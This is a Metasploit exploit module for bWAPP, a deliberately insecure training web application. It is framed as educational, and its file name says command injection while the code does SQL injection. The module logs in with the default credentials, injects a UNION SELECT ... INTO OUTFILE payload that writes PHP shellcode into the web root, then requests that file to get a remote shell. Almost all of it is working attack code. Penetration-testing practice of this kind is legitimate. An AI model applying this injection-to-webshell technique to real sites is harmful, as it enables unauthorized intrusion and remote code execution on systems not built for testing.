##
# /usr/share/metasploit-framework/modules/exploits/multi/http/bwapp-cmdi.rb
#
# bWAPP, or a buggy web application, is a free and open source deliberately insecure web application.
# It helps security enthusiasts, developers and students to discover and to prevent web vulnerabilities.
# bWAPP covers all major known web vulnerabilities, including all risks from the OWASP Top 10 project!
# It is for educational purposes only.
#
# Enjoy!
#
# Malik Mesellem
# Twitter: @MME_IT
#
# Author David Bloom 
# Twitter @philophobia78
#
# © 2014 MME BVBA. All rights reserved.
#
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,

      'Name' => 'bWAPP Sql Injection ',
      'Description' => %q{
      bWAPP Sql Injection vulnerability exploitation, for educational purposes only.
      Bees are ANGRY !!!
      Author : David Bloom <@philophobia78>
      },
      'Author' =>
        [
          'David Bloom <@philophobia78>' #msf module
        ],
      'References' =>
        [
	  ['URL', 'http://www.itsecgames.com/'],
          ['URL', 'http://softage.be/bwappexploited']
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'DisableNops' => true,
          'BadChars'    => "`\"' %&x-",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2014'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base bWAPP directory path", '/bWAPP/']),
        OptString.new('USERNAME', [ true, "Username to authenticate with", 'bee']),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", 'bug'])
      ], self.class)
  end



  #	
  # Check bWAPP sqli.php
  #

  def check

    res = nil

    print_status("Checking bWAPP SQLI")

    begin
    
      login=hive();

      cookies = login.get_cookies

      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, '/sqli_1.php'),
        'cookie' => cookies
      })

    rescue
      
    return CheckCode::Unknown
    end 
    
    if res and res.code ==  200

	print_status("bWAPP sqli_1.php file detected")

        return CheckCode::Vulnerable

    end

    print_error("Unable to access the sqli1.php file")

    return CheckCode::Safe

  end



  #	
  # Exploit bWAPP sqli
  #

  def exploit

      login=hive();

      cookies = login.get_cookies
     
      page =  'images/' + rand_text_alpha_upper(rand(5) + 1 ) + ".php"

      shellcode = payload.encoded
      xploit = "a'  UNION SELECT 1, \"<?php #{shellcode} ?>\",1,1,1,1,1 INTO OUTFILE '/var/www#{target_uri.path}#{page}' -- -"
    
      res = send_request_cgi(
      {
	'method' => 'GET',
        'uri'	=>  normalize_uri(target_uri.path, '/sqli_1.php'),
        'cookie' => cookies,
	'vars_get' => { 'title' => xploit , 'action' => 'search'},
      }, 10)
	
     

      if (res and res.code == 200)

        print_status("Payload uploaded to #{page}")

        send_request_raw({ 'uri' =>  normalize_uri(target_uri.path , page) }, 5)
        handler
      else
        print_error("Exploit failed.")
        return
      end

  end



  #	
  #Login and get a valid session
  #

  def hive
      
      init = send_request_cgi({
        'method' => 'GET',
        'uri' =>  normalize_uri(target_uri.path, '/login.php')
      })

      ses = init.get_cookies

      post = {
        'form'=> 'submit',
	'security_level'=> '0',
        'login' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }

      login = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, '/login.php'),
        'vars_post' => post,
        'cookie' => ses
      })
      return login
  end 
end
